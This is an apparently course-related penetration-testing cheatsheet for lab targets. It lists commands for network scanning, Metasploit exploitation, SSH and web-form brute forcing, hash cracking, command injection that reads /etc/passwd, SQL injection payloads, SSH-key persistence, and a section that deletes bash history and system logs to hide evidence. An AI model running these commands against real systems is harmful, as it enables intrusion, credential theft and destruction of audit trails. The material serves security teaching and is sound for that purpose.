# PB177 Cheatsheet

- [All tools](./tools.md)
- [Labs](./labs.md)
- [Lab image history](./images.md)
- [Podman cheatsheet](./podman.md)

## Useful websites
- vulnerability search
	- https://www.google.com/
	- https://nvd.nist.gov/vuln/search
- hash type identifier
	- https://hashes.com/en/tools/hash_identifier
- hasing, encoding, decoding
	- https://emn178.github.io/online-tools/

## Strategy & Commands

- [Scanning network](#scanning-network)
- [Searching vulnerabilities](#searching-vulnerabilities)
- [Exploiting vulnerability](#exploiting-vulnerability) 
- [Password guessing](#password-guessing)
- [Password cracking](#password-cracking)
- [Command injection](#command-injection)
- [Lateral movement](#lateral-movement)
- [Web](#web)
- [Forced browsing](#forced-browsing)
- [Password guessing web forms](#password-guessing-web-forms)
- [SQL injection](#sql-injection)
- [Hiding evidence](#hiding-evidence)
- [What to always check](#what-to-always-check)

### Scanning network

1. scan network for hosts
```sh
nmap -T5 10.0.33.0/24
```

2. scan host for open ports, application versions, operating system, vulnerabilities
```sh
nmap -T5 -p- -sS -sV -O -Pn 10.0.33.50
```

3. scan port for vulnerabilities (extremely slow - can skip)
```sh
nmap -p 443 --script=vuln -Pn 10.0.66.201
```

4. resolve hostnames
```sh
host 10.0.33.50
```

5. get info about company from certificates
```sh
nmap --script ssl-cert 10.0.66.201 
```

7. check if host is online
```
ping -c 1 10.0.0.254 && echo "Host is ONLINE" || echo "Host is OFFLINE"
```

### Searching vulnerabilities

1. run linpeas
```sh
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh > linpeas.sh
podman cp linpeas.sh attacker:~/linpeas.sh
# or just copy paste file from localhost into container
```

2. search anything sus with google

### Exploiting vulnerability

1. search metasploit for exploit
```sh
search webmin
info 0
```

2. test out exploit
```sh
use 0
set RHOST 10.0.33.80
set LHOST eth0 # for reverse shell
set RPORT 10000
show options
check
```

### Password guessing

1. create a wordlist with AI and python (should be a small file)
```sh
# might need to convert to ascii
cat wordlist.txt | iconv -f utf-8 -t ascii//TRANSLIT > output.txt
file output.txt
```

2. run hydra (should give result right away !!!)
```sh
hydra -l username -P wordlist.txt ssh://10.0.88.2
```

```sh
medusa -t 4 -b -h 10.0.88.2 -u username -P wordlist.txt -M ssh
```

3. connect through ssh and add ssh pub key
```sh
ssh test@10.0.33.110
mkdir -p ~/.ssh
ssh-keygen -t ed25519 -C "email@example.com"
scp .ssh/id_ed25519.pub test@10.0.33.110:~/.ssh/authorized_keys
```

### Password cracking

1. save hash in file

2. get hash type from google search

3. crack with john
```sh
john --format=raw-md5 --wordlist:/usr/share/wordlists/sqlmap.txt passwords.txt
```

4. show results with
```sh
john --show --format=raw-md5 passwords.txt
```

### Command injection

1. figure out the request format

2. forge command injection
```sh
curl -s http://10.0.0.10:80/vulnerabilities/exec/ -X POST --data-raw 'ip=10.0.0.254;cat /etc/passwd&Submit=Submit' | lynx -nolist -dump -stdin
```

### Lateral movement

1. check for more hosts on the system

2. test if you can connect to them with ping
```sh
pinc -c 1 10.0.0.1
```

3. collect info as you go

### Web

- get all scripts used on page
```js
$$("script").map(script => script.getAttribute("src"))
```

### Forced browsing

1. run any of these
```sh
ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://10.0.66.201/FUZZ
```

```sh
dirb http://10.0.66.201
```

```sh
nmap --script=http-enum 10.0.66.201
```

2. can view the page
```sh
curl -X GET -L http://10.0.66.201/something -sS | lynx -nolist -dump -stdin
```

### Password guessing web forms

1. figure out the request format

2. forge command
```sh
hydra -l username -P wordlist.txt 'http-get-form://10.0.0.10:80/vulnerabilities/brute:username=^USER^&password=^PASS^&Login=Login:F=Username and/or password incorrect'
```

```sh
wfuzz -z file,wordlist.txt 'http://10.0.0.10:80/vulnerabilities/brute/?username=admin&password=FUZZ&Login=Login' --hs 'Username and/or password incorrect'
```

```sh
ffuf -w wordlist.txt -u 'http://10.0.0.10:80/vulnerabilities/brute/?username=admin&password=FUZZ&Login=Login' -fr 'Username and/or password incorrect'
```

### SQL injection

1. figure out the request format

2. use one of these
```txt
' OR 1=1 #

UNION SELECT user, password FROM users #
```

3. forge URL with injection
```sh
curl -X POST -H 'Content-Type: application/x-www-form-urlencoded' --data-raw 'uid=%27+OR+true+%23&password=p' 'http://10.0.44.55/customers/'
```

4. or use sqlmap

### Hiding evidence

1. shred files
```sh
shred -u -z -n 3 databackup.sh
```

2. delete bash history and logs
```sh
HISTCONTROL=ignorespace

rm -rf ~/.bash_history
rm -rf /var/log/auth.log
rm -rf /var/log/syslog
```

### What to always check

- run Linpeas

- DNS configuration
```sh
cat /etc/resolv.conf
```

- message of the day
```sh
cat /run/motd.dynamic
cat /var/run/motd.dynamic
```

- bash history
```sh
cat ~/.bash_history
cat ~/.bashrc
cat ~/.bash_profile

# any config for that manner
```

- ssh directory
```sh
ls ~/.ssh
cat .ssh/config
cat .ssh/authorized_keys
```

- other users on the host
```sh
cat /etc/passwd
```

- files
```sh
find / -name "*.docx"
```

- logs
```sh
cat /var/log/auth.log
cat /var/log/syslog
```

- accidental leftover from image setup
```sh
ls /
cat /setup.sh
```
